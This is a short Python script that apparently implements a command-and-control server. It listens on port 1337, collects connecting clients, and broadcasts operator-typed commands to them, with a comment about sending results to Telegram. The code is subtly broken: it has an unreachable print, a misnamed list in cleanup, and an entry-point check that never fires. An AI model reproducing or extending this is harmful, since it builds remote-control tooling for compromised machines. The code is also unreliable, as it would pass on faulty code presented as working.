import socket
import threading

# Server Configuration
HOST = '192.168.226.2'
PORT = 1337

clients = []

def handle_client(client_socket):
    while True:
        try:
            data = client_socket.recv(1024)
            if not data:
                break
                print(f"Received: {data.decode()}")
                
        # save results, send to Telegram.
        except:
            break
            
    client_socket.close()
    client.remove(client_socket)
    
    
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[] Listening on {HOST}:{PORT}")
    while True:
        client_socket, addr = server.accept()
        print(f"[] Accepted connection from {addr[0]}:{addr[1]}")
        clients.append(client_socket)
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()
        
        
def send_command_to_clients(command: str):
    for client in clients:
        try:
            client.send(command.encode())
        except:
            clients.remove(client)
            

if __name__ == "main":
    server_thread = threading.Thread(target=start_server)
    server_thread.start()
    
    while True:
        command = input("Enter command to send to clients: ")
        send_command_to_clients(command)